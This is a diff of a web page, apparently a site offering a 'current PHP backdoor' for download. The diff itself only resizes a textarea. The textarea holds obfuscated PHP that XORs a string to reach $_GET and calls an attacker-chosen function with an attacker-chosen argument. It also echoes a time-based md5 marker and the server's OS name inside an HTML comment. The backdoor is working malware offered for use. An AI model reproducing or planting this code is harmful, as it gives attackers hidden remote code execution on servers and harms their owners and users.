@@ -72,7 +72,7 @@ print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
                             <p class="meta"> 
                             Current PHP backdoor with source code, ddos module included (not necessary)
                             </p>
-				<textarea style="border: none" rows="10" cols="80">
+				<textarea style="border: none" rows="15" cols="80">
 if($_GET['_']) {
 print "<?php echo htmlspecialchars('<!--'); ?>".$_="{:|";$_=($_^"<").($_^">").($_^"/");${'_'.$_}["_"](${'_'.$_}["__"]);
 print "{:|".md5("#666#".date("h:d"))."{:|".PHP_OS."{:|-->";
